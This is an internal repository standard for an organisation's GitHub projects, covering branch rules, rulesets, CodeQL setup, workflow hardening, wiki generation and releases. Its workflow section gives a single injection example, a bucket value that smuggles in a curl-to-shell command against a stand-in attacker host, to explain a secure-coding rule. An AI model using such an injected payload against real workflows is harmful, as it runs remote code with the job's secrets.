# Guys Inc repository standard

Every Guys Inc repository, in every organisation of the enterprise, is set up
the same way, so that a contributor who has worked in one has already learned
the others. The decisions behind it are ADRs 0020 and 0021 in the brand
standards; the rulesets and workflow templates live beside them.

**Two tiers.** Anything marked *(public)* applies to public repositories only.
Everything else applies everywhere, internal and private included.

[`archivist`](https://github.com/Guys-Inc-Public/archivist) is the reference
implementation. When this document and that repository disagree, the repository
is right and this document needs a pull request.

---

## 0. Branches and pull requests

- The default branch is `main`. Branches are `feat/`, `fix/`, `docs/`,
  `chore/` or `switchboard/` plus a slug, or Dependabot's own; a ruleset
  refuses any other name. Branches are deleted on merge.
- Commits reach `main` from **CodeOnkey[bot]** or Dependabot, never from a
  person's account. Clippy reviews; CJ approves as code owner.
- A pull request opens as a draft. Marking it ready starts Clippy's review;
  after that Clippy reviews only what each push adds.
- Stack with GitHub's stacked pull requests (`gh stack`). Every layer is held
  to `main`'s rules. Approvals survive pushes, so a rebase costs nothing;
  Clippy's check still runs on every new head.
- Merge with squash, after `check` and `clippy/review` are green, one
  code-owner approval is in, every thread is resolved and the branch is up to
  date. CJ can overrule Clippy with `/clippy override <reason>`.
- A release is an immutable `vMAJOR.MINOR.PATCH` tag on `main`, and the tag is
  what deploys.
- Forks keep upstream's branch names and are excluded from the rulesets.

## 1. Inherited, not copied *(public)*

These live in this repository and apply to every repository in the organisation.
**Do not copy them into individual repositories** — a copy is a fork that drifts.

| File | Effect |
|---|---|
| `CODE_OF_CONDUCT.md` | Conduct policy org-wide |
| `CONTRIBUTING.md` | Contribution policy org-wide |
| `SECURITY.md` | Vulnerability reporting org-wide |
| `SUPPORT.md` | Where to get help; GitHub surfaces it in the issue chooser |
| `.github/ISSUE_TEMPLATE/` | Issue forms and the contact-link config |
| `.github/PULL_REQUEST_TEMPLATE.md` | PR template |

A repository adds its own `CONTRIBUTING.md` or `SECURITY.md` **only** when it
has something project-specific to say, and then it links back here for policy
rather than restating it.

### Issue templates are all-or-nothing

This one has a trap in it, so it is worth stating plainly.

> "However, if a repository has any files in its own `.github/ISSUE_TEMPLATE`
> folder, such as issue templates or a `config.yml` file, none of the contents
> of the default `.github/ISSUE_TEMPLATE` folder will be used."
> — [GitHub docs](https://docs.github.com/en/communities/setting-up-your-project-for-healthy-contributions/creating-a-default-community-health-file)

Inheritance is per **directory**, not per file. Adding a single `config.yml` to
a repository — to point the chooser at that repository's own Discussions, say —
silently drops the inherited bug-report and feature-request forms with no
warning anywhere.

So: **do not add a partial `ISSUE_TEMPLATE` directory.** Either inherit the
whole thing, which is the default and what nearly every repository should do,
or take ownership of the whole directory because the project genuinely needs
different forms — and then accept that it has to be maintained separately.

Because of this, every link in the inherited `config.yml` is repo-agnostic.
There is no link to a specific repository's Discussions, since that link would
be wrong everywhere except one place. `SUPPORT.md` tells people to use the
Discussions tab of whichever repository they are in, which is correct
everywhere and is one click away in the repository navigation.

## 2. Required in every repository

| Path | Notes |
|---|---|
| `README.md` | Banner from `brand.guysinc.pub`, one sentence, four badges in fixed order (licence, build, docs freshness, version), then Quickstart as the first heading. Template: `readme-header.md` in the `guys-inc-brand` plugin. |
| `LICENSE` *(public)* | MIT, unless there is a stated reason otherwise. |
| `CHANGELOG.md` *(public)* | [Keep a Changelog](https://keepachangelog.com/) format, semantic versioning. |
| `.github/CODEOWNERS` | Review is required from code owners, so this file is what makes that meaningful. |
| `.github/dependabot.yml` | The language ecosystem plus `github-actions`. Grouped updates. |
| `.github/labels.yml` *(public)* | The standard label set, applied by `sync-labels.yml`. |
| `.github/release.yml` *(public)* | Categories for generated release notes. |
| `docs/` | Documentation source of truth. See §4. |
| `docs/decisions/` | ADRs for anything expensive to reverse. |

## 3. Repository settings

Set on creation. `archivist` is the worked example of all of them.

- **Merge strategy:** squash only. Merge commits and rebase merging are off.
  The PR title becomes the commit subject, so PR titles are written in the
  imperative.
- **Always suggest updating the branch:** on, so a stale branch is one click
  (rebase) away from mergeable.
- **Delete head branches on merge:** on.
- **Allow auto-merge:** on.
- **Wiki** *(public)*: on, and generated — never authored. See §4.
- **Discussions** *(public)*: on. Questions and ideas go there; issues are for reproducible
  defects.
- **Projects:** off unless the repository actually uses a board.
- **Security:** secret scanning, push protection, non-provider patterns,
  Dependabot alerts, Dependabot security updates, and code scanning all on.
  The organisation enables the first set by default on new repositories.

  **Code scanning has a trap.** Turning on "Code security" — or making a
  repository public — enables CodeQL **default setup**, and default setup
  cannot coexist with a `codeql.yml` workflow. The workflow runs, analyses
  fine, and then fails at the upload with *"CodeQL analyses from advanced
  configurations cannot be processed when the default setup is enabled"*.

  We use the **advanced** configuration: it is version-controlled and
  reviewable, it runs the `security-extended` query suite, and it scans the
  `actions` language as well as the project's own. So default setup must be
  switched off:

  ```console
  $ gh api -X PATCH repos/OWNER/REPO/code-scanning/default-setup -f state=not-configured
  ```

  Check this after making a repository public, because that is when GitHub
  turns it back on.
- **Topics:** at least five, so the repository is findable.
- **Description and homepage:** always set. A repository with no description
  reads as abandoned.

### Rulesets

Branch and tag protection is enforced by **organisation-level rulesets**, not
per-repository settings, so a new repository is protected the moment it exists.

| Ruleset | Applies to | Enforces |
|---|---|---|
| *Default branch protection* | every repository except forks, default branch | Pull request required, 1 code-owner approval that survives later pushes, review threads resolved, squash only, linear history, branch up to date, `check` and `clippy/review` green, no force push, no deletion |
| *Branch names* | every repository except forks, every other branch | `feat/`, `fix/`, `docs/`, `chore/`, `switchboard/` or `dependabot/` |
| *Release tags are immutable* | every repository except forks, `v*` | No deletion, no updating, no force push |

Organisation admins can bypass, so an owner is never locked out of their own
repository. Nobody else can.

Required status checks are **organisation-wide**: every repository exposes a job
named `check` (below), and Clippy posts `clippy/review`. A repository never needs
a ruleset of its own.

## 4. Documentation and the wiki

`docs/` in the repository is the source of truth. The wiki is a generated,
read-only mirror, rebuilt on every merge to the default branch.

This is deliberate: a wiki has no pull requests, no review, and no status
checks, so documentation written there cannot be changed in the same commit as
the code it describes, and drifts. Documentation that has drifted is worse than
none, because it is trusted.

- Filenames map to wiki page titles: `Signing-Keys.md` → *Signing Keys*. Use
  `Title-Case-With-Hyphens.md`.
- Nested directories flatten with a hyphen, since the wiki has no directories.
- Wiki chrome (`_Sidebar.md`, `_Footer.md`) lives in `.github/wiki/`, not
  `docs/`, because its links are wiki-namespace links that would fail the
  repository's link check.
- `.github/wiki/render.py` does the rendering and **fails on any link it cannot
  resolve**. CI runs it on every pull request, so a broken documentation link
  cannot reach the wiki.

Copy `render.py`, `publish-wiki.yml`, and `.github/wiki/README.md` from
`archivist` unmodified.

> A repository's wiki git remote does not exist until its first page has been
> created, and there is no API for that. Open the repository's wiki once and
> save any page; the workflow takes over from there. It detects this case and
> tells you so rather than failing obscurely.

## 5. Workflows

**Every repository has a job named `check`.** It `needs` the repository's other
CI jobs and fails if any of them failed, so the organisation ruleset can require
one name everywhere. The template is `templates/github/workflows/check.yml` in the
brand standards. The workflow that holds it has no `paths:` filter: a required
check that never starts blocks the merge.

The rest are copied from `archivist` and adjusted for the language. `ci.yml`
applies everywhere; the others are *(public)*.

| Workflow | Purpose |
|---|---|
| `ci.yml` | Build, test, lint, cross-compile, documentation link check |
| `codeql.yml` | CodeQL for the language **and for `actions`** — workflows are code |
| `scorecard.yml` | OpenSSF Scorecard, so supply-chain claims are measured rather than asserted |
| `release.yml` | Signed, reproducible releases with an SBOM and build provenance |
| `publish-wiki.yml` | Renders `docs/` to the wiki |
| `sync-labels.yml` | Applies `.github/labels.yml` |

Rules that apply to all of them:

- `permissions:` is declared at the top of every workflow, starting from
  `contents: read` and widening only where a job needs it.
  **A job-level `permissions:` block sets every scope it does not list to
  `none`** — that is the single most common way these workflows break.
- `persist-credentials: false` on `actions/checkout` unless the job pushes.
- **Pin third-party actions to a commit SHA**, with the version in a trailing
  comment so the file stays readable:

  ```yaml
  - uses: golangci/golangci-lint-action@ba0d7d2ec06a0ea1cb5fa41b2e4a3ab91d21278a # v9
  ```

  A tag is a mutable pointer. Whoever owns the action can move it, and a moved
  tag executes their code with our token. Dependabot updates the SHA and the
  comment together, so this does not go stale.

  Actions under `actions/` and `github/` stay on major tags: GitHub owns both
  those organisations and the runner executing them, so a SHA buys nothing.
  CodeQL's `actions` analysis enforces exactly this split, and will comment on
  a pull request that gets it wrong — which is also why `codeql.yml` includes
  `actions` in its language matrix. Workflows are code.
- **Never interpolate `${{ }}` into a `run:` block.** Pass the value through
  `env:` and reference it as a shell variable:

  ```yaml
  # wrong - the value is pasted into the script before bash sees it
  run: archivist publish --bucket "${{ inputs.bucket }}"

  # right - bash receives the value as data
  env:
    BUCKET: ${{ inputs.bucket }}
  run: archivist publish --bucket "$BUCKET"
  ```

  A bucket value of `b"; curl attacker.example/x | sh; echo "` is not a bucket
  name in the first form — it is three commands, run with whatever secrets the
  job holds. This applies to any expression an outside contributor can
  influence: inputs, issue and PR titles and bodies, branch names. CodeQL's
  `actions` analysis catches it and will comment on the pull request.
- Every job that writes to a shared destination declares a `concurrency` group.
- Never end a step in `|| true`. A swallowed failure in a publish step produces
  a green run and a broken artefact, which is worse than a red run.

## 6. Releases

- Tags are `vMAJOR.MINOR.PATCH` and are immutable, everywhere.
- *(public)* Every release is signed, ships an SBOM, and records a build-provenance
  attestation.
- Signing keys: CI holds a **signing subkey**; the primary key is
  certify-only and stays offline. Rotation is documented before launch, not
  after the first expiry. See
  [archivist's signing key documentation](https://github.com/Guys-Inc-Public/archivist/blob/main/docs/Signing-Keys.md).

## 7. Checklist for a new repository

- [ ] Description, homepage, and at least five topics set
- [ ] `README.md` from the brand template; *(public)* MIT `LICENSE`, `CHANGELOG.md`
- [ ] Default branch `main`; squash-only merges, delete branch on merge, auto-merge allowed, update branch suggested
- [ ] Projects off; *(public)* Discussions on, Wiki on
- [ ] Secret scanning, push protection, Dependabot, code scanning on
- [ ] `.github/CODEOWNERS`, `dependabot.yml`; *(public)* `labels.yml`, `release.yml`
- [ ] Workflows copied from `archivist` and adjusted for the language
- [ ] A job named `check` that needs every other CI job
- [ ] *(public)* Wiki opened once so its remote exists
- [ ] `docs/Home.md` and `docs/decisions/README.md` created
- [ ] First release tagged only after CI has been green on the default branch
